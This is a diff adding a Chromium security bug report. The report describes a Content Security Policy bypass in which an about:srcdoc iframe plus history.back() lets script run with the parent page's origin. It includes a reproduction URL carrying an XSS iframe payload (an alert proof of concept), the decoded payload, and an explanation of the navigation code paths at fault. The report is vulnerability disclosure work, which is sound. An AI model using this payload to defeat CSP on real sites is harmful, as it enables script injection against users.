@@ -1,0 +1,34 @@
+VULNERABILITY DETAILS
+
+https://crbug.com/chromium/1001283 showed how to bypass CSP on chrome 78.0.3903.0 and above.
+
+I tweaked it a bit to bypass CSP on every versions of Chrome (verified on M76). I guess it should be possible to reproduce it to at least M59.
+
+The difference: I used history.back() instead of location.href = "about:srcdoc"
+
+REPRODUCTION CASE
+Go to https://test.shhnjk.com/unxssable.php?xss=%20<iframe%20name="iframe_a"%20srcdoc="<script>alert(origin)</script>%20<p>about-srcdoc%20iframe</p>%20<a%20href=%27https://go-back.glitch.me%27%20target=%27iframe_a%27>click%20here</a>"%20</iframe>
+
+You should see javascript execute with the main document origin. Even if CSP forbid script execution.
+
+(Decoded)
+~~~
+<iframe name="iframe_a" srcdoc="<script>alert(origin)</script>
+  <p>about-srcdoc iframe</p>
+  <a href='https://go-back.glitch.me' target='iframe_a'>click here</a>"
+</iframe>
+~~~
+
+EXPLANATION:
+
+(please read https://crbug.com/chromium/1001283)
+
+There used to be two navigation code paths for loading about:srcdoc
+ 1) The normal one. Used only for browser initiated navigation.
+ 2) The edge-case-legacy one for loading about:srcdoc. Used for document initiated navigation.
+
+I removed path 2) completely. Nowadays, every navigations to about:srcdoc are the same. They are using path 1.
+It looks like path 1 is broken, because CSP are not properly inherited? (I need to check)
+
+https://crbug.com/chromium/1001283 relied to path 1) to be used. That's why it can only reproduce on M78+.
+But we can use path 1) by using history.back() instead to reproduce the problem on every versions of Chrome.
